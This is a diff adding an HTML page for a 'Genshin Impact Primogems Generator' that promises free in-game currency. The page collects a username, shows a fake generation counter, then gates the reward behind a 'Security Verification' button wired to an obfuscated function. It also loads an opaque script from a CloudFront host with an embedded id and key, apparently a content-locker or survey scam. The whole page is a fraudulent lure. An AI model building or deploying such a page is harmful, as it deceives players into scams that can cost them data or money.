@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Genshin Impact Primogems Generator</title>
+    <meta name="description" content="Professional Genshin Impact Primogems Generator - Get free primogems for your adventure">
+    <meta property="og:title" content="Genshin Impact Primogems Generator">
+    <meta property="og:description" content="Professional Genshin Impact Primogems Generator - Get free primogems for your adventure">
+    <meta name="referrer" content="no-referrer">
+    <link rel="shortcut icon" href="https://i.postimg.cc/nrdQ69gx/gen-primogems-farm.webp" type="image/x-icon">
+
+    
+    <!-- Tailwind CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
+    
+    <link rel="stylesheet" href="style.css">
+    <script src="app.js"></script>
+</head>
+
+
+<body class="min-h-screen bg-gray-900 text-white overflow-x-hidden">
+    <!-- Background Overlay -->
+    <div class="fixed inset-0 bg-black opacity-50 z-0"></div>
+    
+    <!-- Header -->
+    <header class="relative z-10 bg-white bg-opacity-10 backdrop-filter backdrop-blur-lg border-b border-white border-opacity-20">
+        <div class="container mx-auto px-4 py-4">
+            <div class="flex items-center justify-center">
+                <img src="images/1641063623ea5eb28164f8b5e9e0fad2bebbbcfcf1.png" alt="Genshin Impact Logo" class="h-12 md:h-16 animate-bounce-gentle">
+                <div class="ml-4 text-center">
+                    <h1 class="text-xl md:text-2xl font-bold text-white">Primogems Generator</h1>
+                    <p class="text-sm text-blue-200">Professional & Secure</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="relative z-10 container mx-auto px-4 py-8">
+        <!-- Screen 1: Username Input -->
+        <div id="screen1" class="max-w-md mx-auto animate-fadeIn">
+            <div class="glass-effect rounded-3xl p-8 shadow-2xl card-hover">
+                <div class="text-center mb-8">
+                    <div class="w-20 h-20 bg-gradient-genshin rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse-glow">
+                        <i class="fas fa-user text-2xl text-white"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold text-white mb-2">Primogems Generator</h2>
+                    <p class="text-blue-200">Enter your username or ID to get started</p>
+                </div>
+                
+                <div class="space-y-10">
+                    <div class="relative">
+                        <input 
+                            style="text-align: center;"
+                            type="text" 
+                            id="inputname" 
+                            placeholder="Username or ID"
+                            class="w-full px-6 py-4 bg-white bg-opacity-10 border border-white border-opacity-20 rounded-2xl text-white placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 input-glow"
+                            autocomplete="off"
+                            oninput="textinput()"
+                        >
+                        <div class="absolute inset-y-0 left-0 pl-6 flex items-center pointer-events-none">
+                            <i class="fas fa-gamepad text-gray-400"></i>
+                        </div>
+                    </div>
+                    
+                    <button 
+                        id="bntNext" 
+                        onclick="bntNext()" 
+                        class="w-full bg-gradient-button hover:bg-gradient-button text-white font-semibold py-4 px-8 rounded-2xl transition-all duration-300 transform hover:scale-105 hover:shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
+                    >
+                        <i class="fas fa-arrow-right mr-2"></i>
+                        CONTINUE
+                    </button>
+                </div>
+                
+                <div id="loader" class="hidden mt-8 flex justify-center">
+                    <div class="loader-dots">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 2: Package Selection -->
+        <div id="screen2" class="max-w-2xl mx-auto animate-scaleIn" style="display: none;">
+            <div class="glass-effect rounded-3xl p-8 shadow-2xl">
+                <div class="text-center mb-8">
+                    <div class="w-20 h-20 bg-gradient-genshin rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-gem text-2xl text-white"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold text-white mb-2">Choose Your Package</h2>
+                    <p class="text-blue-200">Username: <span id="username1" class="text-yellow-300 font-semibold"></span></p>
+                </div>
+                
+                <div class="grid gap-4 md:gap-6">
+                    <div class="package-card bg-gradient-card rounded-2xl p-6 cursor-pointer card-hover" onclick="package(1)">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center">
+                                <img src="images/16818071054fb891c3d3af5c2d9f8f6ed2c7933c00.png" alt="Primogems" class="w-16 h-16 primogem-glow">
+                                <div class="ml-4">
+                                    <h3 class="text-xl font-bold text-white">Starter Pack</h3>
+                                    <p class="text-2xl font-bold text-yellow-300">2,500 Primogems</p>
+                                </div>
+                            </div>
+                            <div class="text-green-400">
+                                <i class="fas fa-check-circle text-2xl"></i>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="package-card bg-gradient-card rounded-2xl p-6 cursor-pointer card-hover" onclick="package(2)">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center">
+                                <img src="images/16818071054fb891c3d3af5c2d9f8f6ed2c7933c00.png" alt="Primogems" class="w-16 h-16 primogem-glow">
+                                <div class="ml-4">
+                                    <h3 class="text-xl font-bold text-white">Advanced Pack</h3>
+                                    <p class="text-2xl font-bold text-yellow-300">5,000 Primogems</p>
+                                </div>
+                            </div>
+                            <div class="text-blue-400">
+                                <i class="fas fa-star text-2xl"></i>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="package-card bg-gradient-card rounded-2xl p-6 cursor-pointer card-hover" onclick="package(3)">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center">
+                                <img src="images/16818071054fb891c3d3af5c2d9f8f6ed2c7933c00.png" alt="Primogems" class="w-16 h-16 primogem-glow">
+                                <div class="ml-4">
+                                    <h3 class="text-xl font-bold text-white">Ultimate Pack</h3>
+                                    <p class="text-2xl font-bold text-yellow-300">9,999 Primogems</p>
+                                </div>
+                            </div>
+                            <div class="text-purple-400">
+                                <i class="fas fa-crown text-2xl"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 3: Processing -->
+        <div id="screen3" class="max-w-lg mx-auto animate-scaleIn" style="display: none;">
+            <div class="glass-effect rounded-3xl p-8 shadow-2xl">
+                <div class="text-center mb-8">
+                    <div class="w-20 h-20 bg-gradient-genshin rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-cog fa-spin text-2xl text-white"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold text-white mb-2">Processing Request</h2>
+                    <p class="text-blue-200">Username: <span id="username" class="text-yellow-300 font-semibold"></span></p>
+                </div>
+                
+                <div id="loader2" class="flex justify-center mb-6">
+                    <div class="loader-dots">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div>
+                
+                <div class="text-center mb-6">
+                    <p id="processing" class="text-lg text-blue-200">Initializing...</p>
+                </div>
+                
+                <div class="bg-gradient-card rounded-2xl p-6 mb-6">
+                    <div class="flex items-center justify-center">
+                        <img src="images/16818071054fb891c3d3af5c2d9f8f6ed2c7933c00.png" alt="Primogems" class="w-16 h-16 primogem-glow">
+                        <div class="ml-4">
+                            <p class="text-sm text-gray-300">Generated</p>
+                            <p id="resourcesGen" class="text-3xl font-bold text-yellow-300">+0</p>
+                            <p class="text-sm text-gray-300">Primogems</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="verifyrequired" class="text-center mb-6" style="display: none;">
+                    <div class="bg-yellow-500 bg-opacity-20 rounded-2xl p-4 mb-4">
+                        <i class="fas fa-shield-alt text-yellow-400 text-2xl mb-2"></i>
+                        <h3 class="text-lg font-bold text-yellow-300">Security Verification Required</h3>
+                        <p class="text-sm text-yellow-200">Complete verification to receive your primogems</p>
+                    </div>
+                    <img src="images/1670527980d601870f9293b4a78d462c229447469e.gif" alt="Verification" class="w-12 h-12 mx-auto mb-4">
+                </div>
+                
+                <button 
+                    id="verify" 
+                    onclick="_VE()" 
+                    class="w-full bg-gradient-button hover:bg-gradient-button text-white font-semibold py-4 px-8 rounded-2xl transition-all duration-300 transform hover:scale-105 hover:shadow-lg"
+                    style="display: none;"
+                >
+                    <i class="fas fa-shield-check mr-2"></i>
+                    VERIFY NOW
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+   
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script type="text/javascript">
+        var fYgqJ_OVQ_WprYwc={"it":4504706,"key":"43d1d"};
+    </script>
+    <script src="https://dfmpe7igjx4jo.cloudfront.net/752c67d.js"></script>
+ 
+</body>
+</html>
